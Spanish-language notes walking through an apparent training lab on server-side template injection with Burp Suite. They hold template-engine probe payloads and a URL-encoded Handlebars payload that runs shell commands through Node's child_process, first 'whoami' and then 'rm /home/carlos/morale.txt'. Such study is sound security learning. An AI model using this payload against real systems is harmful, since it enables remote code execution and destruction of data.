
![[Pasted image 20221020121934.png]]

este lab no tiene autentication, cuando quiero ver el detalle de un producto hay un mensaje que se muestra

![[Pasted image 20221020122203.png]]

este es el get request

![[Pasted image 20221020122404.png]]

enviamos al intruder esta mismo request

![[Pasted image 20221020122534.png]]

en este momento la idea es probar que tipo de lenguaje y template engine tiene este lab, para eso utilizaremos el siguiente listado de payloads tomados de hacktrickz:

![[Pasted image 20221020122756.png]]

{{7*7}}

${7*7}

<%= 7*7 %>

${{7*7}}

#{7*7}

*{7*7}

![[Pasted image 20221020122944.png]]

luego me voy a options y voy a extraer la variable que he creado (custommessage)

me voy a:
1. Grep Extract
2.  Add
3. refetch response
4. en la barra de busqueda pongo custommessage, lo sombreo y le doy ok

![[Pasted image 20221020123254.png]]

![[Pasted image 20221020123407.png]]


con esto le doy Start Attack

![[Pasted image 20221020123449.png]]


me interesa los que me generaron error, ordenandolos por esa columna

![[Pasted image 20221020123524.png]]

hago click en una de ellos, en el response le doy click derecho y selecciono Show in browser, copio la direccion y la pego en el navegador

![[Pasted image 20221020123639.png]]

![[Pasted image 20221020123710.png]]

vemos que el lab esta usando handlebars

entonces busco un payload relacionado a handlebars, de hecho, este fue un bounty relacionado a shopify

![[Pasted image 20221020123929.png]]

copio el payload y lo pego en el repeater en el request que ya habia cachado

![[Pasted image 20221020124140.png]]

pero ahora tengo que cortarlo y pasarlo al encoder para decode como URL:

![[Pasted image 20221020124326.png]]


%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%77%68%6f%61%6d%69%27%29%3b%22%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%7b%7b%2f%77%69%74%68%7d%7d

seguidamente en el repeater en lugar de custommessage pego este decode y ejecuto, si todo sale bien debo buscar en el output un custommessage:

![[Pasted image 20221020124814.png]]

efectivamente tuvo un status 200 y veo que hay un codigo ejecutado:

![[Pasted image 20221020124853.png]]


ahora regreso al decoder y en lugar del whoami pongo el comando rm /home/carlos/morale.txt

![[Pasted image 20221020125028.png]]

esta vez voy a dejar antes custommessage para poder ubicar el resultado

![[Pasted image 20221020125243.png]]


![[Pasted image 20221020125218.png]]


![[Pasted image 20221020125315.png]]






